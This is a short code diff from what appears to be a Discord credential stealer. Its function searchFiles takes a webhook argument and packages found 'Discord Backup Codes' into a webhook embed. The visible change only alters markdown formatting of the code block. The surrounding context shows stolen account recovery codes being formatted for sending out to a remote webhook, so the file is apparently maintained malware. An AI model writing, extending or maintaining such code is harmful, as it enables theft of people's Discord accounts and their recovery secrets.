@@ -66,7 +66,7 @@ function searchFiles(dir, webhook) {
                                             embeds: [
                                                 {
                                                     title: 'Discord Backup Codes',
-                                                    description: `\`\`\`yml\n${codes.length === 0 ? 'Not found' : codes}\n\`\`\``,
+                                                    description: `\`\`\`\n${codes.length === 0 ? 'Not found' : codes}\n\`\`\``,
                                                 }
                                             ]
                                         };
